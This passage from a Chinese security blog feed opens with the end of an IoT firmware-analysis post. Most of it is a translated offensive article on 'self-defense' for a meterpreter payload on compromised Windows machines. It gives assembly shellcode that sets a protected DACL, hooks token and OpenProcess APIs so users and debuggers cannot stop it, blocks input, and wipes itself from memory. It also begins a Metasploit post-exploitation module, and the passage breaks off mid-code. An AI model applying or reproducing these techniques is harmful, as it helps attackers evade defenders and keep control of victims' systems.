<li>搜索获取powerpc相关sig库，<a href="https://github.com/IridiumXOR/uclibc-sig" target="_blank" rel="external">https://github.com/IridiumXOR/uclibc-sig</a></li>
<li>安装linux powerpc交叉编译库，提取lib</li>
<li>根据固件中的Copyright string: “Copyright MGC 2004 - Nucleus PLUS - MPC860 Diab C/C++ v. 1.14”字符串，安装VxWorks Tornado开发环境，提取lib<br>最后还是Tornado开发环境中提取的lib制作的sig有效，这里分享下<a href="https://pan.baidu.com/s/17ulZN" target="_blank" rel="external">Tornado.V2.2.POWERPC下载地址</a>，我是xp环境才安装运行成功的，提取的路径如下C:\Tornado\host\diab\PPCCS<br>效果如下：</li>
</ul>
<div align="center"><br><img src="/img/firmware_ida_sig.png" align><br></div>

<h2 id="0x04_TODO">0x04 TODO</h2><p>由于并没有实际运行环境，这里并没有进行动态分析，分析起来难度较大，后续可能尝试能否使用qemu-system模式将固件运行起来进行动态调试。</p>
<h2 id="0x05_参考">0x05 参考</h2><p><a href="https://cq674350529.github.io/2021/03/04/Zyxel设备eCos固件加载地址分析/" target="_blank" rel="external">Zyxel设备eCos固件加载地址分析</a><br><a href="http://gb.oversea.cnki.net/KCMS/detail/detail.aspx?filename=1018812112.nh&amp;dbcode=CDFD&amp;dbname=CDFDREF" target="_blank" rel="external">ARM设备固件装载基址定位的研究_朱瑞瑾</a><br><a href="https://bbs.pediy.com/thread-191928.htm" target="_blank" rel="external">PowerPC下C逆向指南</a><br><a href="http://blog.nsfocus.net/function-recognition-reverse-engineering-iot-equipment/" target="_blank" rel="external">IOT设备逆向工程中的函数识别</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="0x0_简介">0x0 简介</h2><p><strong>本文已被看雪智能设备版本设置为精华文章：<a href="https://bbs.pediy.com/thread-266803.htm">https://bbs.pediy.com/thread-266803.htm</a></strong><br>获取到一个设备的固件，有6M，基本没在网上找到对该固件进行分析的文章，因此决定按照固件分析的一般思路对该固件进行逆向分析，实践学习下。主要用到的工具binwalk、ida pro 7.5、ghidra。首先使用binwalk获取固件基础信息，首先看下能不能提取出文件来：</p>
<div align="center"><br><img src="/img/firmware_binwalk_e.png" align=""/><br></div>]]>
    
    </summary>
    
      <category term="IOT安全" scheme="http://www.youngroe.com/tags/IOT%E5%AE%89%E5%85%A8/"/>
    
      <category term="IOT" scheme="http://www.youngroe.com/categories/IOT/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[反检测的艺术4-自保护（翻译）]]></title>
    <link href="http://www.youngroe.com/2020/10/02/Cybersecurity/art-of-anti-detection-4-art-of-anti-detection-4-self-defense/"/>
    <id>http://www.youngroe.com/2020/10/02/Cybersecurity/art-of-anti-detection-4-art-of-anti-detection-4-self-defense/</id>
    <published>2020-10-02T11:39:22.000Z</published>
    <updated>2021-03-18T12:43:38.267Z</updated>
    <content type="html"><![CDATA[<p>在反检测的艺术系列中，我们主要研究了如何绕过自动化安全产品的方法，但是在这一部分中，我们将重点介绍几种自保护方法，保护我们在目标终端上的载荷免受其实际用户的破坏。用户可能是缺乏网络技术的员工或也有可能是网络安全部门的蓝队成员。我们的目的是在没有任何特权的情况下存活并在目标终端中隐藏我们的存在。但是，在继续学习之前，我建议您阅读本系列的前几篇文章，因为这些自保护方法包含大量的有关shellcoding和API hooking的前置知识，现在我们开始吧！<br><a id="more"></a><br>在渗透测试时我们常使用meterpreter载荷，因此我们的主要目标将是为Metasploit构建一个后漏洞利用模块。该模块激活后应能够保护运行meterpreter载荷的进程免受用户干预。同样，在设计此模块时，我们将以x86和x64 Shellcode形式实现这些自保护方法，这将使我们能够将该自保护方法部署到其他正在运行的进程中。首先，我们需要考虑用户如何破坏目标系统上的会话。第一个明显的操作是用几个系统内置工具来终止未知/可疑的过程。我们的第一个技巧将是防止进程终止。在本文中，我们将假定我们的meterpreter会话与用户具有相同的特权。因为这是公司网络中最有可能发生的情况。公司的大多数用户帐户没有管理权限。我们将通过利用Windows内部的某些逻辑来尝试实现。因此，该模块应该能够在不提升特权的情况下工作。由于Windows用户帐户控制（UAC）的原因，我们将针对不同的Windows版本考虑不同的策略。</p>
<h2 id="0x00_进程保护">0x00 进程保护</h2><p>第一个技巧将针对Windows 7及更低版本。尽管Windows 7已有10年的历史，但仍在世界范围内大量使用。在这些版本中，非管理员用户可以创建受保护的进程，这会导致一种奇怪的情况，即用户创建了无法被创建者终止的进程。当一个进程受到保护时，只有管理员用户可以对其进行操作。当非管理员用户尝试终止受保护的进程会弹出错误提示，</p>
<div align="center"><br><img src="/img/anti_av4_terminate_process.gif" align><br></div>

<p>同样不仅有关终止进程，还禁止所有与打开受保护进程的句柄有关的操作。为了保护进程，我们需要设置一个特殊的安全描述符。根据MSDN，安全描述符结构包含与对象关联的安全信息。如;</p>
<ul>
<li>所有者<a href="https://docs.microsoft.com/windows/desktop/SecGloss/s-gly" target="_blank" rel="external">安全标识符</a>（SID）</li>
<li>组SID</li>
<li><a href="https://docs.microsoft.com/windows/desktop/SecGloss/d-gly" target="_blank" rel="external">访问控制列表</a>（DACL）</li>
<li><a href="https://docs.microsoft.com/windows/desktop/SecGloss/s-gly" target="_blank" rel="external">系统访问控制列表</a>（SACL）</li>
<li>前述项目的预选赛</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> _SECURITY_DESCRIPTOR &#123;</span><br><span class="line">  BYTE                        Revision;</span><br><span class="line">  BYTE                        Sbz1;</span><br><span class="line">  SECURITY_DESCRIPTOR_CONTROL Control;</span><br><span class="line">  PSID                        Owner;</span><br><span class="line">  PSID                        Group;</span><br><span class="line">  PACL                        Sacl;</span><br><span class="line">  PACL                        Dacl;</span><br><span class="line">&#125; SECURITY_DESCRIPTOR, *PISECURITY_DESCRIPTOR;</span><br></pre></td></tr></table></figure>
<p>这些结构可以用安全描述符字符串格式表示，该格式是用于在安全描述符中存储或传输信息的文本格式。格式是一个以令牌结尾的空终止字符串，用于指示安全描述符的四个主要组成部分：所有者（O :)，主要组（G :)，DACL（D :)和SACL（S :)。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">O:owner_sid</span><br><span class="line">G:group_sid</span><br><span class="line">D:dacl_flags(string_ace1)(string_ace2)... (string_acen)</span><br><span class="line">S:sacl_flags(string_ace1)(string_ace2)... (string_acen)</span><br></pre></td></tr></table></figure>
<p>为了保护进程，我们需要将D：P设置为SE_DACL_PROTECTED标志。为了在进程的SECURITY_DESCRIPTOR中设置此类标志，我们需要使用特定的Windows API函数。首先，我们需要将字符串安全描述符格式转换为适当的安全描述符结构。为此，我们将调用<a href="https://docs.microsoft.com/en-us/windows/win32/api/sddl/nf-sddl-convertstringsecuritydescriptortosecuritydescriptora" target="_blank" rel="external">ConvertStringSecurityDescriptorToSecurityDescriptorA</a>函数。该功能采用以下参数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">ConvertStringSecurityDescriptorToSecurityDescriptorA</span><span class="params">(</span><br><span class="line">  LPCSTR               StringSecurityDescriptor,</span><br><span class="line">  DWORD                StringSDRevision,</span><br><span class="line">  PSECURITY_DESCRIPTOR *SecurityDescriptor,</span><br><span class="line">  PULONG               SecurityDescriptorSize</span><br><span class="line">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>如上所示，需要有一个已经声明的安全描述符结构来设置新的描述符。我们将首先声明一个SECURITY_ATTRIBUTES结构，其中将包含我们的SECURITY_DESCRIPTOR。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SECURITY_ATTRIBUTES sa;</span><br><span class="line">TCHAR * szSD = TEXT(<span class="string">"D:P"</span>);</span><br><span class="line">sa.nLength = <span class="keyword">sizeof</span>(SECURITY_ATTRIBUTES);</span><br><span class="line">sa.bInheritHandle = FALSE;</span><br><span class="line"></span><br><span class="line">ConvertStringSecurityDescriptorToSecurityDescriptor(szSD,SDDL_REVISION_1, &amp;(sa.lpSecurityDescriptor)</span><br></pre></td></tr></table></figure>
<p>将字符串安全描述符转换为SECURITY_ATTRIBUTES结构之后，现在我们需要获取要保护的进程句柄。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());</span><br></pre></td></tr></table></figure>
<p>最后，我们将调用SetKernelObjectSecurity，此函数设置内核对象的安全性。设置好准备的安全描述符后，我们的进程终于可以免受野蛮用户的侵害了。现在，我们需要将这一系列API调用转换为shellcode。除了创建SECURITY_ATTRIBUTES结构之外，对此没有什么棘手的问题。我们将总共执行4个API调用，最多包含4个参数。根据我们的shellcoding文章，构造这样的shellcode应该没有问题。唯一棘手的部分是创建SECURITY_ATTRIBUTES结构，因为您需要以字节为单位计算结构的总大小，并在首次创建时复制存储在内部的值。为了简化工作，编译用C编写的代码，然后使用调试器查看SECURITY_ATTRIBUTES结构。</p>
<div align="center"><br><img src="/img/anti_av4_x86_api.png" align><br></div><br>在x86系统中，此结构的长度为12个字节，在x64系统中，此大小加倍。产生的汇编代码应如下所示；<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">; x86 ConvertStringSecurityDescriptorToSecurityDescriptor call</span><br><span class="line">    push <span class="number">0x00503a44</span>            ; <span class="string">"D:P"</span></span><br><span class="line">    sub esp,<span class="number">4</span>                  ; Push the address of <span class="string">"D:P"</span> <span class="built_in">string</span> to <span class="built_in">stack</span></span><br><span class="line">    push <span class="number">0x00000000</span>            ; FALSE</span><br><span class="line">    lea eax, [esp+<span class="number">4</span>]           ; Load the address of <span class="number">4</span> byte buffer to EAX</span><br><span class="line">    push eax                   ; Push the <span class="number">4</span> byte buffer address</span><br><span class="line">    push <span class="number">0x00000001</span>            ; SDDL_REVISION_1 </span><br><span class="line">    lea eax, [esp+<span class="number">16</span>]          ; Load the address of <span class="string">"D:P"</span> <span class="built_in">string</span> to EAX</span><br><span class="line">    push eax                   ; Push the EAX value</span><br><span class="line">    push <span class="number">0xDA6F639A</span>            ; hash(advapi32.dll, ConvertStringSecurityDescriptorToSecurityDescriptor)</span><br><span class="line">    call ebp                   ; ConvertStringSecurityDescriptorToSecurityDescriptor(<span class="string">"D:P"</span>,SDDL_REVISION_1,FALSE)</span><br></pre></td></tr></table></figure><br><br>其余的shellcoding应该更容易。我们还需要考虑一个微小的细节。我们将使用Metasploit框架的<a href="https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf/Post/Windows/Process:execute_shellcode" target="_blank" rel="external">execute_shellcode</a>函数。此函数只是将shellcode注入进程，然后通过打开远程线程来执行它。执行完后，我们的shellcode需要调用适当的函数来正确终止线程。这意味着我们需要在所有shellcode的末尾附加<a href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_exitfunk.asm" target="_blank" rel="external">block_exitfunk.asm</a>代码。该块确定当前的Windows版本，并相应地调用适当的退出函数。<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[BITS <span class="number">64</span>]</span><br><span class="line"></span><br><span class="line">exitfunk:</span><br><span class="line">  mov ebx, <span class="number">0x0A2A1DE0</span>   ; The EXITFUNK as specified by user...</span><br><span class="line">  mov r10d, <span class="number">0x9DBD95A6</span>  ; hash( <span class="string">"kernel32.dll"</span>, <span class="string">"GetVersion"</span> )</span><br><span class="line">  call rbp              ; GetVersion(); (AL will = major version and AH will = minor version)</span><br><span class="line">  add rsp, <span class="number">40</span>           ; cleanup the <span class="keyword">default</span> param space on <span class="built_in">stack</span></span><br><span class="line">  cmp al, byte <span class="number">6</span>        ; If we are not running on Windows Vista, <span class="number">2008</span> or <span class="number">7</span></span><br><span class="line">  jl <span class="keyword">short</span> goodbye      ; Then just call the <span class="built_in">exit</span> function...</span><br><span class="line">  cmp bl, <span class="number">0xE0</span>          ; If we are trying a call to kernel32.dll!ExitThread on Windows Vista, <span class="number">2008</span> or <span class="number">7.</span>..</span><br><span class="line">  jne <span class="keyword">short</span> goodbye     ;</span><br><span class="line">  mov ebx, <span class="number">0x6F721347</span>   ; Then we substitute the EXITFUNK to that of ntdll.dll!RtlExitUserThread</span><br><span class="line">goodbye:                ; We now perform the actual call to the <span class="built_in">exit</span> function</span><br><span class="line">  push byte <span class="number">0</span>           ;</span><br><span class="line">  pop rcx               ; <span class="built_in">set</span> the <span class="built_in">exit</span> function parameter</span><br><span class="line">  mov r10d, ebx         ; place the correct EXITFUNK into r10d</span><br><span class="line">  call rbp              ; <span class="function">call <span class="title">EXITFUNK</span><span class="params">( <span class="number">0</span> )</span></span>;</span><br></pre></td></tr></table></figure><br><br>这是此方法的完整<a href="https://github.com/EgeBalci/SelfDefense/blob/master/x86/ProtectProcess/protect_process.asm" target="_blank" rel="external">x86</a>和<a href="https://github.com/EgeBalci/SelfDefense/blob/master/x64/ProtectProcess/protect_process.asm" target="_blank" rel="external">x64</a> shellcode。但是这种方法只能解决一半的过程终止问题。具有管理特权的用户仍可以通过以管理员身份运行进程终止工具来终止受保护的进程。因此，我们的第二个技巧应该用户UAC提权。<br><br>## 防止提权<br>为了防止特权提升，我们需要了解进程如何获取某些特权。当进程需要执行某些任务时，因此它需要具有适当的访问令牌，需要特殊的权限。终止或打开受保护进程的句柄也需要某些令牌。有几种获取这些访问令牌的方法，几乎​​所有方法都包括以下两个API函数的使用：<br><br>第一个是<a href="https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges" target="_blank" rel="external">AdjustTokenPrivileges</a>，此功能启用或禁用指定访问令牌中的特权。几乎所有需要令牌操作的特权操作都使用此API函数。<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">AdjustTokenPrivileges</span><span class="params">(</span><br><span class="line">  HANDLE            TokenHandle,</span><br><span class="line">  BOOL              DisableAllPrivileges,</span><br><span class="line">  PTOKEN_PRIVILEGES NewState,</span><br><span class="line">  DWORD             BufferLength,</span><br><span class="line">  PTOKEN_PRIVILEGES PreviousState,</span><br><span class="line">  PDWORD            ReturnLength</span><br><span class="line">)</span></span>;</span><br></pre></td></tr></table></figure><br><br>第二个重要函数是<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/wdm/nf-wdm-rtlsetdaclsecuritydescriptor" target="_blank" rel="external">RtlSetDaclSecurityDescriptor</a>，此函数设置绝对格式安全描述符的DACL信息，或者如果安全描述符中已经存在DACL，则将其取代。<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSYSAPI NTSTATUS <span class="title">RtlSetDaclSecurityDescriptor</span><span class="params">(</span><br><span class="line">  PSECURITY_DESCRIPTOR SecurityDescriptor,</span><br><span class="line">  BOOLEAN              DaclPresent,</span><br><span class="line">  PACL                 Dacl,</span><br><span class="line">  BOOLEAN              DaclDefaulted</span><br><span class="line">)</span></span>;</span><br></pre></td></tr></table></figure><br><br>从理论上讲，如果我们能够找到一种方法来禁用进程中的这两个功能，让它根本无法更改其令牌特权，因此无法执行特权操作。为了在远程进程中禁用这两个功能，我们需要使用内联API挂钩。我们使用内联挂钩的原因是因为我们的目标主要是任务管理器之类的系统进程。这些系统二进制文件没有在导入地址表中使用函数地址，而是在运行时动态加载所需的API函数。因此，patch IAT条目（IAT挂钩）对我们而言不起作用，我们需要能够直接重定向或patch这些功能。为了实现这一点，我们需要使用一个内联钩子汇编块。此块patch了函数序言的前两个字节，使我们可以将函数重定向到其他地方或返回任何值。在我们的情况下，我们需要它返回true。这个汇编模块，它需要一个名为patch的二进制文件，其中包含在函数序言部分写入汇编指令功能。为了从这些函数返回true，应遵循以下说明；<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">; x64 <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">db <span class="number">0x48</span>,<span class="number">0x31</span>,<span class="number">0xc0</span>    ; xor rax,rax</span><br><span class="line">db <span class="number">0xc3</span>              ; ret</span><br><span class="line"></span><br><span class="line">; x86 <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">db <span class="number">0x32</span>,<span class="number">0xc0</span>         ; xor eax,eax</span><br><span class="line">db <span class="number">0xc3</span>              ; ret</span><br></pre></td></tr></table></figure><br><br>现在，此块将使用给定的哈希值对函数进行修补，并使其返回零。一旦在进程内执行此shellcode，任何令牌提升尝试都将返回false，因此该进程将无法升级特权。<br><br><br>## 阻止输入<br><br>这是次要的细节。我们的meterpreter载荷可能正在带有图形用户界面的应用程序内部运行，这可能意味着可能有多个按钮用于终止应用程序。通过调用<a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-blockinput" target="_blank" rel="external">BlockInput</a> API函数，我们将阻止所有键盘和鼠标输入事件到达托管有效载荷的应用程序。<br><br>## 自我移除<br>这是开发此模块的最重要作用之一。我没有指定调用API函数的任何特定方法，可以通过几种方法来完成，但是更简单的方法是使用Metasploit block API。但使用block API具有很大的挑战，可被安全产品检测到。在尝试保持存在并保持存活的同时，我们还需要从内存中删除所有可疑shellcode，尤其是block API。因此，在完成保护进程并在其他进程进行hook之后，我们需要设置一个序幕prologue，该序幕prologue将清除内存中的shellcode。但是此任务有点棘手，因为要终止线程，我们需要调用适当的API函数。要调用函数，我们还需要block API。这种情况迫使我们首先获取所需的终止函数地址，然后从内存中擦除shellcode。生成的shellcode应该看起来像这样；<br><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">    push 0x0000006c                 ; 0x00,l</span><br><span class="line">    push 0x6c642e6c                 ; ld.l</span><br><span class="line">    push 0x6c64746e                 ; ldtn</span><br><span class="line">    push esp                        ; &amp;"ntdll.dll"</span><br><span class="line">    push 0x0726774C                 ; hash("KERNEL32.dll", "LoadLibraryA")</span><br><span class="line">    call ebp                        ; LoadLibraryA("ntdll.dll")</span><br><span class="line">    push 0x00000064                 ; 0x00,d</span><br><span class="line">    push 0x61657268                 ; aerh</span><br><span class="line">    push 0x54726573                 ; Tres</span><br><span class="line">    push 0x55746978                 ; Utix</span><br><span class="line">    push 0x456c7452                 ; EltR</span><br><span class="line">    push esp                        ; &amp;"RtlExitUserThread"</span><br><span class="line">    push eax                        ; HANDLE (KERNEL32.dll)</span><br><span class="line">    push 0x7802F749                 ; hash("KERNEL32.dll", "GetProcAddress")</span><br><span class="line">    call ebp                        ; GetProcAddress(HANDLE, "RtlExitUserThread")</span><br><span class="line">    mov ebp,eax                     ; Save the RtlExitUserThread address to EDI</span><br><span class="line">    ; PEB manipulation</span><br><span class="line">    xor eax,eax                     ; Zero EAX (upper 3 bytes will remain zero until function is found)</span><br><span class="line">    mov ebx,[fs:eax+0x30]           ; Get a pointer to the PEB</span><br><span class="line">    mov ebx,[ebx+0x0C]              ; Get PEB-&gt;Ldr  </span><br><span class="line">    mov eax,[ebx + 0x0C]            ; InOrderModuleList</span><br><span class="line">    mov dword [eax+0x20],0xFFFFFF   ; SizeOfImage</span><br><span class="line">    ; Wipe self defense shellcode</span><br><span class="line">total_size: equ $-self_defense      ; Set the size of the self defense shellcode to total_size label</span><br><span class="line">    mov ecx,total_size              ; Move the total size of the self defense shellcode to ECX</span><br><span class="line">    call $+5</span><br><span class="line">    pop eax</span><br><span class="line">clean:</span><br><span class="line">    mov byte [eax],0x00             ; Wipe 1 byte</span><br><span class="line">    dec eax                         ; Increase index</span><br><span class="line">    loop clean                      ; Loop until all shellcode cleared from memory</span><br><span class="line">    push 0x00                       ; NULL              </span><br><span class="line">    call ebp                        ; RtlExitUserThread(0)</span><br></pre></td></tr></table></figure><br><br>对于某些安全产品，从内存中删除shellcode可能不够。设计变形编码器可能非常有帮助。为了简短起见，我不会在本文中包括编码部分。在编写了自我删除序言prologue之后，现在我们将它们全部合并在一起，最终的<a href="https://github.com/EgeBalci/SelfDefense/blob/master/x86/self_defense.asm" target="_blank" rel="external">x86</a>和<a href="https://github.com/EgeBalci/SelfDefense/blob/master/x64/self_defense.asm" target="_blank" rel="external">x64</a>自保护shellcode已准备好了。在继续执行Metasploit模块之前，我们还需要针对Windows不同版本实现不同的解决方案，该版本的Windows我们的之前提出的进程保护技术无效。<br><br>## 防止被终止<br><br>没有受保护的进程，Windows 8/10用户可以直接终止我们的会话。在这种情况下该怎么办？经过深思熟虑，一个明显的答案就浮现了，我们可以简单地在所有能够终止进程的程序中禁用所有进程终止API。但是我们还需要保护我们的载荷以免被分析。调试器和任何类型的监视工具也不应附加到我们的进程中。所有这些都可以通过挂钩OpenProcess API来实现。由于<a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess" target="_blank" rel="external">OpenProcess</a>是非常基础的API，我们可以通过注入进程利用多种方式对其削弱。某些程序一旦调用OpenProcess失败就会崩溃。这可以以更安全和隐秘的方式完成。我之所以选择它是因为懒，但是这解决了我们的进程被终止问题。我们可以使用前面的钩子shellcode。唯一需要更改的是传递给内联钩子块的函数散列。添加此代码后，我们的shellcoding阶段结束。<br><br><br>## Metasploit模块<br>现在，我们需要构造MSF post模块，该模块会将我们的shellcode注入相应的进程中。让我们从选择一个漏洞利用后模块模板开始。我们的模块不会采用任何强制性参数。将有两个可选参数，分别称为PID和LOOP。该模块应能够保护托管我们的meterpreter载荷的进程。 PID参数将指定要注入我们的shellcode的进程ID。 LOOP参数将指定模块是否连续运行。以下模板设置所需的漏洞利用后类和元数据。<br><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">class MetasploitModule &lt; Msf::Post</span><br><span class="line"></span><br><span class="line">  include Msf::Post::File</span><br><span class="line">  include Msf::Post::Windows::Process</span><br><span class="line"></span><br><span class="line">  def initialize(info = &#123;&#125;)</span><br><span class="line">    super(update_info(info,</span><br><span class="line">        'Name'          =&gt; 'Process Protector',</span><br><span class="line">        'Description'   =&gt; %q&#123;</span><br><span class="line">          This module will protect the given process with injecting special shellcodes and disabling key API functions using inline hooking.</span><br><span class="line">        &#125;,</span><br><span class="line">        'License'       =&gt; MSF_LICENSE,</span><br><span class="line">        'Author'        =&gt; [ 'Ege Balcı' ],</span><br><span class="line">        'Platform'      =&gt; [ 'win'],</span><br><span class="line">        'SessionTypes'  =&gt; [ 'meterpreter']</span><br><span class="line">    ))</span><br><span class="line">        </span><br><span class="line">    register_options([</span><br><span class="line">      OptString.new('PID', [false, 'The target process ID for the UAC elevation.' ]),</span><br><span class="line">      OptBool.new('LOOP', [false, 'Continiously check running processes for elevation prevention.' ]),</span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure><br><br>在声明了初始元数据和类之后，现在我们将构造run方法。首先，我们需要检查该会话是否为meterpreter会话。<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor"># Make sure we meet the requirements before running the script, note no need to return</span></span><br><span class="line">    <span class="preprocessor"># unless <span class="keyword">error</span></span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span> <span class="keyword">if</span> session.type != <span class="string">"meterpreter"</span></span><br></pre></td></tr></table></figure><br><br>现在检查会话类型之后，我们将检查是否指定了特殊的PID值。如果不是，则此模块应针对包含我们的Meterpreter会话的进程。我们可以通过一个简单的检查来做到这一点，Metasploit中的每个post模块都有一个<a href="https://www.rubydoc.info/github/rapid7/metasploit-framework/Rex/Post/Meterpreter/Client" target="_blank" rel="external">client类</a>。根据ruby文档，此类提供了一个与Rex开发后接口兼容的接口，该接口试图公开其功能集。此类旨在驱动单个meterpreter客户端会话。通过调用client.sys.process.getpid，我们可以获得获取会话的进程的当前进程ID。<br><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if datastore['PID'].to_s == ''</span><br><span class="line">  pid = client.sys.process.getpid.to_i</span><br><span class="line">else</span><br><span class="line">  pid = datastore['PID'].to_i</span><br><span class="line">end</span><br></pre></td></tr></table></figure><br><br>为了避免在shellcode程序代码中重复使用块API，我们将声明一次并在所有shellcode程序代码中使用它们。实际上，Metasploit已经具有生成内置在其中的block_api.asm的机制。但是由于懒，我直接在模块内部声明了已组装的block_api.asm。<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor"># https:<span class="comment">//github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm</span></span></span><br><span class="line">block_api_32 = <span class="string">""</span></span><br><span class="line">block_api_32 &lt;&lt; <span class="string">"\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\x0c"</span></span><br><span class="line"><span class="preprocessor"># SNIP ...</span></span><br><span class="line">block_api_32 &lt;&lt; <span class="string">"\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a"</span></span><br><span class="line">block_api_32 &lt;&lt; <span class="string">"\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d"</span></span><br><span class="line"></span><br><span class="line"><span class="preprocessor"># https:<span class="comment">//github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/block/block_api.asm</span></span></span><br><span class="line">block_api_64 = <span class="string">""</span></span><br><span class="line">block_api_64 &lt;&lt; <span class="string">"\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48"</span></span><br><span class="line"><span class="preprocessor"># SNIP ...</span></span><br><span class="line">block_api_64 &lt;&lt; <span class="string">"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a"</span></span><br><span class="line">block_api_64 &lt;&lt; <span class="string">"\x48\x8b\x12\xe9\x4f\xff\xff\xff"</span></span><br></pre></td></tr></table></figure><br><br>我知道看起来很难看，如果您知道在利用漏洞利用模块中生成块API的更好方法，请告诉我。我还以相同的方式汇编并声明了我们准备的shellcode。<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 